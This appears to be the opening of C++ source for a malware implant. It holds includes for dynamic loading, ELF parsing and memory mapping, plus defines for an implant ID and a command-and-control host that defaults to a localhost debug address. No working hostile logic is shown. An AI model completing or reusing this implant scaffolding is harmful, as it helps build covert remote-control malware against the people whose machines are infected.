
#include <iostream>
#include <string.h>
#include <dlfcn.h>

// For JSON parsing.
#include <map>
#include <vector>
#include <sstream>

// Get computer information
#include <sys/utsname.h>

// For parsing the ELF files.
#include <elf.h>
#include <sys/mman.h>

// Check if the compiler gives us an implant ID else use the fake one.
#ifndef SLAVE_ID
    #define SLAVE_ID "TEST_SLAVE_ID"
#endif

// Check if compiler gives us a C2 host address else use the debug one.
#ifndef C2HOST
    #define C2HOST "127.0.0.1:8080"
#endif